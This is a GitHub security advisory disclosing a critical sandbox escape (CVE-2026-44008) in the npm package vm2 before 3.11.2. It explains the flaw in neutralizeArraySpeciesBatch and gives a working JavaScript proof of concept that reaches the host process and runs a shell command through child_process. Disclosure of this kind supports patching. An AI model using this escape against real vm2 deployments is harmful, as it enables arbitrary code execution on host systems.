# [C] vm2 has sandbox breakout via `neutralizeArraySpeciesBatch`

## Summary
Severity: Critical
Advisory: GHSA-9qj6-qjgg-37qq
CVE: CVE-2026-44008
CWE: CWE-668
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-08
Source: https://github.com/advisories/GHSA-9qj6-qjgg-37qq
Type: github-advisory

## Affected
- npm: `vm2` — affected >=0 <3.11.2

## Details
### Summary

VM2 suffers from a sandbox breakout vulnerability. This allows attackers to write code which can escape from the VM2 sandbox and execute arbitrary commands on the host system.

### Details

The new method `neutralizeArraySpeciesBatch` works with objects from the other side but can call into this side via getter on the array prototype exposing objects of the wrong side into the sandbox. This can be used to get host objects and get the host `Function` object.

### PoC

```js
const {VM} = require("vm2");
const vm = new VM();
console.log(vm.run(`
const a = [];
Object.defineProperty(Array.prototype, 0, {
	set(value) {
		a.f = Buffer.prototype.inspect;
		value.arr.f.constructor.constructor("return process")().mainModule.require('child_process').execSync('touch pwned');
	}
});
new Buffer(a);
`));
```

### Impact

Attackers can perform Remote Code Execution under the assumption that arbitrary code can be executed inside the context of a vm2 sandbox.

## References
- https://github.com/patriksimek/vm2/security/advisories/GHSA-9qj6-qjgg-37qq
- https://nvd.nist.gov/vuln/detail/CVE-2026-44008
- https://github.com/patriksimek/vm2
- https://github.com/patriksimek/vm2/releases/tag/v3.11.2
